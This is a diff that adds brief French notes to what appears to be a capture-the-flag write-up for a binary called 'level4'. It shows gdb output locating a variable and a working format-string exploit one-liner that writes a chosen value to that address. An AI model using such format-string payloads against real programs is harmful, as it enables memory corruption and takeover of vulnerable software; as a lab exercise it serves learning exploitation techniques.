@@ -1,1 +1,7 @@
+On va se servir de la meme faille de securite que l'exercice precedent.
+
+addresse de m
+(gdb) x 0x8049810
+0x8049810 <m>:	0x00000000
+
 cat <(python -c 'print("\x10\x98\x04\x08" + "%16930112d" + "%12$n")') - | ./level4
